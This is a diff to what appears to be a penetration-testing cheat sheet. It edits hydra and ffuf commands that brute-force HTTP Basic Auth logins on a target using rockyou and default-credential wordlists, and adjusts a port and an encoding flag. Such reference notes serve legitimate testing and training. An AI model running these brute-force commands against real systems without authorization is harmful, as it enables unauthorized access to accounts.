@@ -298,12 +298,12 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP \
 **Login Brute Forcing**
 
 ```bash
-# Hydra http-get against Basic Auth endpoint
-hydra -L users.txt -P pass.txt -u TARGET_IP -s PORT http-get /admin/
+# Hydra http-get against Basic Auth endpoint (use -s for non-default HTTP port)
+hydra -L users.txt -P pass.txt -u TARGET_IP -s 8080 http-get /admin/
 
 # ffuf Basic Auth using base64-encoded user:pass pairs
 ffuf -w /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt:FUZZ \
-  -u http://TARGET_IP/admin/ -H 'Authorization: Basic FUZZ' -enc FUZZ:b64 -fc 401
+  -u http://TARGET_IP/admin/ -H 'Authorization: Basic FUZZ' -enc FUZZ:b64encode -fc 401
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -425,6 +425,8 @@ hydra -l <user> -P passwords.txt -t 4 smtp://<IP>
 - [Official documentation 1](https://github.com/vanhauser-thc/thc-hydra)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
